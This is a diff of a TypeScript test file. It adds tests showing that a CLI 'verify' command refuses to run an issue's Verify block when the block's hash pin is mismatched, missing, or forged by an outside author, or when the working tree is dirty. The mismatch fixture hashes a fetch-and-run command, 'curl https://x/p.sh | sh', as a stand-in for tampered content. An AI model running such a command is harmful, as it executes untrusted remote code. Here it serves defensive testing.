@@ -1,8 +1,10 @@
 import assert from "node:assert/strict";
+import { createHash } from "node:crypto";
 import { readFileSync, writeFileSync } from "node:fs";
 import { dirname, join } from "node:path";
 import { describe, test } from "node:test";
 import { fileURLToPath } from "node:url";
+import { parseTicket } from "../src/ticket.ts";
 import { runCase } from "./harness.ts";
 import { git, gitRepo, runSpp, tempDir } from "./fixtures/verify/git.ts";
 
@@ -10,12 +12,30 @@ const here = dirname(fileURLToPath(import.meta.url));
 const ghJson = (name: string) => readFileSync(join(here, "fixtures", "verify", name, "gh.json"), "utf8");
 const noteOnHead = (repo: string) => git(repo, "notes", "--ref=sdd-verify", "show", "HEAD");
 
+const COMMENTS = "api repos/{owner}/{repo}/issues/12/comments --paginate --jq .[] | [.id, .body, .user.login, .author_association] | @json";
+const VIEWER = "api graphql -f query=Viewer --jq .data.viewer.login";
+const sha256 = (s: string) => createHash("sha256").update(s).digest("hex");
+
+// How the issue's progress comment pins its Verify block: to the block as it stands, to another block, not at all,
+// or to the block as it stands but in a comment from an outside author.
+type Pin = "match" | "mismatch" | "missing" | "forged";
+
+function pinnedGh(fixture: string, pin: Pin): string {
+  const gh = JSON.parse(ghJson(fixture));
+  const block = parseTicket(gh["issue view 12 --json body"].stdout.body).verify!;
+  const trailer = (verifyPin: string) => `<!-- sdd-progress -->\n<!-- sdd-data: ${Buffer.from(JSON.stringify({ verifyPin })).toString("base64")} -->`;
+  const row = (verifyPin: string, login = "maint", association = "OWNER") => JSON.stringify([9, trailer(verifyPin), login, association]) + "\n";
+  const stdout = { match: row(sha256(block)), mismatch: row(sha256("curl https://x/p.sh | sh")), missing: "", forged: row(sha256(block), "mallory", "NONE") }[pin];
+  return JSON.stringify({ ...gh, [COMMENTS]: { stdout }, [VIEWER]: { stdout: "maint\n" } });
+}
+
 // A case directory that is also a git repository on `branch`, its gh answers and args committed.
-const repoCase = (args: string[], fixture = "pass", branch = "main") =>
-  gitRepo(branch, { "gh.json": ghJson(fixture), args: args.join("\n") + "\n" });
+const repoCase = (args: string[], fixture = "pass", branch = "main", pin: Pin = "match") =>
+  gitRepo(branch, { "gh.json": pinnedGh(fixture, pin), args: args.join("\n") + "\n" });
+const noNote = (repo: string) => assert.throws(() => noteOnHead(repo), /no note found/);
 
 describe("happy path", () => {
-  test("spp verify 12 whose Verify is `true` prints pass and writes a verified note on HEAD", async () => {
+  test("spp verify 12 whose Verify is `true` and matches its pin prints pass and writes a verified note on HEAD", async () => {
     const repo = repoCase(["12"]);
     const r = await runCase("verify", repo);
     assert.equal(r.code, 0, r.stderr);
@@ -77,6 +97,42 @@ describe("error path", () => {
     const r = runSpp(["verify", "--check"], "", repo);
     assert.equal(r.code, 2);
     assert.match(r.stderr, /uncommitted changes/);
+  });
+
+  test("a Verify block that no longer matches its pin is refused: nothing runs, no note, re-harden named", async () => {
+    const repo = repoCase(["12"], "pass", "main", "mismatch");
+    const r = await runCase("verify", repo);
+    assert.equal(r.code, 1);
+    assert.equal(r.stdout, "");
+    assert.match(r.stderr, /changed since it was hardened.*re-harden/i);
+    noNote(repo);
+  });
+
+  test("an issue with no pinned Verify block is refused", async () => {
+    const repo = repoCase(["12"], "pass", "main", "missing");
+    const r = await runCase("verify", repo);
+    assert.equal(r.code, 1);
+    assert.equal(r.stdout, "");
+    assert.match(r.stderr, /not pinned.*re-harden/i);
+    noNote(repo);
+  });
+
+  test("a pin in a progress comment from an outside author counts as no pin", async () => {
+    const repo = repoCase(["12"], "pass", "main", "forged");
+    const r = await runCase("verify", repo);
+    assert.equal(r.code, 1);
+    assert.match(r.stderr, /not pinned/);
+    noNote(repo);
+  });
+
+  test("a run on a dirty tree is refused before any command runs, and records nothing", async () => {
+    const repo = repoCase(["12"]);
+    writeFileSync(join(repo, "loose.txt"), "x");
+    const r = await runCase("verify", repo);
+    assert.equal(r.code, 1);
+    assert.equal(r.stdout, "");
+    assert.match(r.stderr, /uncommitted changes/);
+    noNote(repo);
   });
 
   test("spp verify with no ticket exits 2 with usage", () => {
